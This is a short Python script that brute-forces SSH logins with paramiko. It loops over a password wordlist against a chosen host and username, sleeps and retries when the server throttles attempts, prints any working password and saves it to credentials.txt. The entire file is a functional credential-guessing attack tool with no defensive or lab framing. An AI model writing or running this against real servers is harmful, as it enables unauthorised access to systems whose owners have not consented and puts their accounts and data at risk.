import socket
import time
import argparse
import os
import paramiko
from colorama import init, Fore

init()

BLUE = Fore.BLUE
RESET = Fore.RESET
RED = Fore.RED
GREEN = Fore.GREEN


def is_ssh_open(hostname, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # Set out errors and display the correct messages
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        print(f"{RED}[!] Host {hostname} unreachable.{RESET}")
        return False
    except paramiko.AuthenticationException:
        print(f"[!] Credentials are invalid {username} : {password}")
        return False
    except paramiko.SSHException:
        print(f"{BLUE}[*] Quota exceeded, retrying with delay... {RESET}")

        time.sleep(60)
        return is_ssh_open(hostname, username, password)
    else:
        print(
            f"{GREEN}[+] Found credentials:\n\tHostname: {hostname}\n\tUsername: {username}\n\tPassword: {password}{RESET}")
        return True


if __name__ == "__main__":
    # Set the arguments
    parse = argparse.ArgumentParser(description="SSH Bruteforce Python Script.")
    parse.add_argument("host", help="Host name or IP address to brute force SSH")
    parse.add_argument("-P", "--passlist", help="File that contain password list in each line.")
    parse.add_argument("-u", "--user", help="Host name")

    args = parse.parse_args()
    host = args.host
    passList = args.passlist
    user = args.user

    # Read the pass list file
    passList = open(passList).read().splitlines()

    # Brute Force
    for password in passList:
        if is_ssh_open(host, user, password):
            # If valid save to file
            open("credentials.txt", "w").write(f"{user}@{host}:{password}")
